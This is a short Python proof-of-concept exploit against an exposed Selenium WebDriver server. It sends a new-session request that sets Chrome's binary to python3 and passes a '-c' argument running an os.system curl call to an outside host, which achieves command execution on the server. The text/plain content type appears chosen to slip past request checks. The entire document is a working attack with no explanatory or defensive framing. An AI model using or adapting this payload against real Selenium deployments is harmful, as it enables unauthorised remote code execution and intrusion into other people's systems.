import requests
import json

url = "http://localhost:4444/wd/hub/session"

payload = {
    "capabilities": {
        "alwaysMatch": {
            "browserName": "chrome",
            "goog:chromeOptions": {
                "binary": "/usr/bin/python3",
                "args": ["-cimport os;os.system('curl http://192.168.42.130:8080/from_container')"]
            }
        }
    }
}

headers = {
    'Content-Type': 'text/plain'
}

response = requests.request("POST", url, headers=headers, data=json.dumps(payload))

print(response.text)
